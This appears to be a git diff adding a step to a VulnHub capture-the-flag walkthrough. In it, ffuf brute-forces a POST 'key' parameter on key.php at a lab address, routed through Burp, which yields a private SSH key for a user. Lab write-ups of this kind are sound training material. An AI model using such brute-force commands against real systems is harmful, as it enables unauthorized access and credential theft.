@@ -36,11 +36,21 @@ ffuf -w /root/wordlist/raft-medium-words.txt -u http://192.168.127.133/FUZZ -e .
 and i found a file called `key.php` :
 
 
+![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/7a3152ed-373c-4fb6-b81b-a5a566011137)
 
+for finding the key, i used several injection methods, sqli, ci and different payloads, but finally i captured one of the requests in burp and used the same headers in ffuf to send the POST request :
 
+```bash
+ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.127.133/key.php -X POST -d key=FUZZ -x http://127.0.0.1:8080 -H 'Content-Type: application/x-www-form-urlencoded'
 
+1165685715469           [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 5ms]
+```
 
+open it in burp :
 
+![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/fa03f419-8fc1-43b3-931a-602649e563f7)
+
+and it gives you a private ssh key for user `mpampis`
 
 
 
